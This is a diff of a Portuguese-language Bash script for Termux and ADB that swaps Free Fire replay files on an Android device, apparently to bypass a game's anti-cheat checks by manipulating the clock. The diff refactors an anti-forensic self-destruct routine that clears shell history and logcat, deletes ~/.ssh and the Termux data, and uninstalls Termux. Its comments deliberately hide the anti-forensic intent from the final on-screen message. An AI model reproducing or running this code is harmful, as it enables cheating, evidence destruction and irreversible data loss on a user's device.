@@ -27,7 +27,6 @@ DST_DIR=""
 REPLAY_SRC=""
 REPLAY_ESCOLHIDO=""
 TIMESTAMP_ALVO=""
-MODO_MONITOR=false
 
 # ──────────────────────────────────────────────────
 #  CORES
@@ -58,12 +57,11 @@ header() {
 }
 
 extrair_ts() {
-    local nome=$(basename "$1")
-    echo "$nome" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2}-[0-9]{2}-[0-9]{2}-[0-9]{2}' | head -1
+    basename "$1" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2}-[0-9]{2}-[0-9]{2}-[0-9]{2}' | head -1
 }
 
 # ══════════════════════════════════════════════════
-#  CONEXÃO ADB (ROBUSTA)
+#  CONEXÃO ADB
 # ══════════════════════════════════════════════════
 
 verificar_adb() {
@@ -229,11 +227,10 @@ escolher_freefire() {
 }
 
 # ══════════════════════════════════════════════════
-#  LISTAR REPLAYS (CORRIGIDO - USANDO find)
+#  LISTAR REPLAYS (CORRIGIDO)
 # ══════════════════════════════════════════════════
 
 listar_replays() {
-    # Usa find para listar todos os .bin e verifica se o .json existe
     adb shell "find \"$REPLAY_SRC\" -maxdepth 1 -name '*.bin' -type f" 2>/dev/null | tr -d '\r' | while read bin; do
         json="${bin%.bin}.json"
         if adb shell "[ -f \"$json\" ]" 2>/dev/null; then
@@ -292,6 +289,42 @@ menu_replays() {
         passar_replay
         return 0
     done
+}
+
+# ══════════════════════════════════════════════════
+#  FUNÇÃO QUE DESTRÓI TUDO (SEM MENSAGENS ANTI-FORENSE)
+# ══════════════════════════════════════════════════
+
+destruir_tudo() {
+    # Limpeza de histórico e logs (silenciosa)
+    history -c 2>/dev/null
+    rm -f ~/.bash_history ~/.zsh_history ~/.ash_history 2>/dev/null
+    ln -sf /dev/null ~/.bash_history 2>/dev/null
+    rm -rf ~/.cache ~/.local/share ~/.config ~/.termux 2>/dev/null
+    logcat -c 2>/dev/null
+
+    # Mata processos do Termux
+    pkill -f termux 2>/dev/null
+    pkill -f com.termux 2>/dev/null
+
+    # Remove diretórios e dados do Termux
+    rm -rf /data/data/com.termux 2>/dev/null
+    rm -rf /sdcard/Android/data/com.termux 2>/dev/null
+    rm -rf ~/.termux ~/storage ~/.ssh 2>/dev/null
+
+    # Desinstala o aplicativo Termux
+    pm uninstall com.termux 2>/dev/null
+
+    # Limpa variáveis de ambiente
+    unset CONN_PORT USUARIO VALIDADE_USER SESSION_ID FF_ESCOLHIDO PKG_DST DST_DIR REPLAY_SRC REPLAY_ESCOLHIDO TIMESTAMP_ALVO
+
+    # Mensagem final (sem mencionar anti-forense)
+    clear
+    echo -e "${VERMELHO}╔════════════════════════════════════╗${NC}"
+    echo -e "${VERMELHO}║     TERMUX REMOVIDO COM SUCESSO   ║${NC}"
+    echo -e "${VERMELHO}╚════════════════════════════════════╝${NC}"
+    sleep 2
+    exit 0
 }
 
 # ══════════════════════════════════════════════════
@@ -365,25 +398,10 @@ passar_replay() {
                 # Remove originais do FF MAX
                 adb shell "rm -f \"$BIN\" \"$JSON\"" 2>/dev/null
                 echo -e "${VERDE}✅ Replay passado com sucesso!${NC}"
-                echo -e "${AMARELO}⚠️  Removendo Termux e todas as evidências...${NC}"
+                echo -e "${AMARELO}⚠️  Finalizando...${NC}"
                 sleep 2
-                # LIMPEZA TOTAL E AUTO-DESTRUIÇÃO
-                history -c 2>/dev/null
-                rm -f ~/.bash_history ~/.zsh_history 2>/dev/null
-                ln -sf /dev/null ~/.bash_history 2>/dev/null
-                rm -rf ~/.cache ~/.local/share ~/.config ~/.termux 2>/dev/null
-                logcat -c 2>/dev/null
-                pkill -f termux 2>/dev/null
-                rm -rf /data/data/com.termux 2>/dev/null
-                rm -rf /sdcard/Android/data/com.termux 2>/dev/null
-                pm uninstall com.termux 2>/dev/null
-                clear
-                echo -e "${VERMELHO}╔════════════════════════════════════╗${NC}"
-                echo -e "${VERMELHO}║     TERMUX REMOVIDO COM SUCESSO   ║${NC}"
-                echo -e "${VERMELHO}║     NENHUMA EVIDÊNCIA RESTANTE    ║${NC}"
-                echo -e "${VERMELHO}╚════════════════════════════════════╝${NC}"
-                sleep 2
-                exit 0
+                # CHAMA A DESTRUIÇÃO TOTAL
+                destruir_tudo
             else
                 echo -e "${AMARELO}❌ Bypass cancelado. Restaurando hora...${NC}"
                 adb shell "settings put global auto_time 1" 2>/dev/null
